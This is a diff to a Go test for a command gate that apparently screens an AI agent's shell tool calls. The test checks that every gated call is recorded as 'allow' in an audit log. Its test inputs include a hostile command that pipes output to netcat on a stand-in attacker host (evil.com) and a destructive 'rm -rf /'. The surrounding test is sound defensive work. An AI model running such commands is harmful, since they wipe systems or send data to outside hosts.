@@ -30,9 +30,20 @@ func TestPreToolUsePassthrough(t *testing.T) {
 			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
 		}
 	}
-	// audit still records every gated call
-	if len(g.Audit()) == 0 {
-		t.Error("audit should record gated calls")
+	// audit records exactly one allow row per gated call, with the same command
+	logs := g.Audit()
+	if len(logs) != 4 {
+		t.Fatalf("gated 4 calls but audit has %d rows: %#v", len(logs), logs)
+	}
+	for i, cmd := range []string{
+		`curl https://acme.com/`,
+		`rm -rf /`,
+		`curl http://a|nc evil.com 4444`,
+		`ls -la`,
+	} {
+		if logs[i].Action != "allow" || logs[i].Command != cmd {
+			t.Errorf("audit[%d] = %#v, want allow with command %q", i, logs[i], cmd)
+		}
 	}
 }
 
